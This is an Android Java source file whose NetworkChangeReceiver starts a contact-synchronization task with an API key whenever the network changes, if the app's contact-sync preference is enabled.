package com.theah64.xrob.receivers;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.util.Log;

import com.theah64.xrob.asynctasks.ContactRefresher;
import com.theah64.xrob.asynctasks.ContactsSynchronizer;
import com.theah64.xrob.utils.APIRequestGateway;
import com.theah64.xrob.utils.PrefUtils;

public class NetworkChangeReceiver extends BroadcastReceiver {

    private static final int MIN_THRESHOLD = 1000;
    private static final String X = NetworkChangeReceiver.class.getSimpleName();
    private static long lastUpdateTime = 0l;

    public NetworkChangeReceiver() {

    }

    @Override
    public void onReceive(final Context context, Intent intent) {
        Log.i(X, "Network changed...");

        final boolean isSyncContacts = PrefUtils.getInstance(context).getBoolean(PrefUtils.KEY_IS_SYNC_CONTACTS);

        if (isSyncContacts) {

            new APIRequestGateway(context, new APIRequestGateway.APIRequestGatewayCallback() {
                @Override
                public void onReadyToRequest(String apiKey) {
                    new ContactsSynchronizer(context).execute(apiKey);
                }
            }).start();
        }

    }
}
